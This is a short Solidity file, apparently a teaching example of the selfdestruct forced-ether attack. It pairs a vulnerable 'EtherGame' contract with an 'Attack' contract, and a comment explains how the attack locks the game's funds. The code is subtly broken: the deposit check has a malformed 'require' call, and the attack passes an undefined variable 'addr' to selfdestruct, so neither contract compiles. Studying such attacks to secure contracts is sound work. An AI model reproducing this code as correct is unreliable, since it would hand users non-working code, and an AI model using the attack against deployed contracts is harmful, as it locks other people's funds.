// SPDX-License-Identifier: MIT
pragma solidity ^0.8.13;

contract EtherGame {
    uint public targetAmount = 1 ether;

    address public winner;

    function deposit() public payable {
        require(msg.value == 0, 1 ether, "You can only send 0,1 Ether");

        uint balance = address(this).balance;
        require(balance <= targetAmount, "game is over");

        if (balance == targetAmount) {
            winner = msg.sender;
        }
    }

    function claimReward() public {
        require(msg.sender == winner, "not the winner");

        (bool sent, ) = msg.sender.call{value: address(this).balance}("");

        require(sent, "Failed to send Ether");
    }
}

//the attack contract will clog the EtherGame contract with too much ether, surpassing the targetAmount, and therefore no one will be
//recorded as a winner, and the balance on the contract will remain locked, unable to be withdrawn.
contract Attack {
    EtherGame etherGame;

    constructor(EtherGame _etherGameAddress) {
        etherGame = EtherGame(_etherGameAddress);
    }

    function attack() public payable {
        address payable targetAddress = payable(address(etherGame));
        selfdestruct(addr);
    }
}
